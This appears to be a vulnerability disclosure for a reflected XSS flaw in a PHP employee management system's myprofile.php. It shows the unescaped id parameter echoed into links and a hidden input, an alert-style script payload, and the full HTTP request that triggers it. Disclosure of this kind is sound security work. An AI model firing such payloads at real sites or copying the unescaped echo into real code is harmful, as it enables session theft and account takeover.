## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/myprofile.php` contains a Reflected XSS vulnerability

Impact of the vulnerability
An attacker can craft a malicious URL that injects HTML/JavaScript into the employee profile page. If a victim visits the URL, the injected script may execute in the victim’s browser, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions as the victim)
- Phishing/UI manipulation (modifying page content to trick users)

### Payload:

"><ScRiPt>alert(55)</ScRiPt>

```
"><ScRiPt>alert(55)</ScRiPt>
```

### POC:

The vulnerable endpoint is `GET /myprofile.php?id=...`. The `id` parameter is inserted into HTML attributes (navigation links and hidden input) without HTML escaping:

<ul id="navli">

  <li><a class="homeblack" href="eloginwel.php?id=<?php echo $id?>"">HOME</a></li>

  <li><a class="homered" href="myprofile.php?id=<?php echo $id?>"">My Profile</a></li>

  <li><a class="homeblack" href="empproject.php?id=<?php echo $id?>"">My Projects</a></li>

  <li><a class="homeblack" href="applyleave.php?id=<?php echo $id?>"">Apply Leave</a></li>

<input type="hidden" name="id" id="textField" value="<?php echo $id;?>" required="required"><br><br>

Send the following request (URL-encoded payload):

GET /myprofile.php?id=%22%3E%3CScRiPt%3Ealert%2855%29%3C%2FScRiPt%3E HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The response HTML contains the injected string inside `href="...id=..."` (and/or the hidden input `value`). When rendered in a browser, the script executes (e.g., a popup `alert(55)`), confirming reflected XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409152115386](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409152115386.png)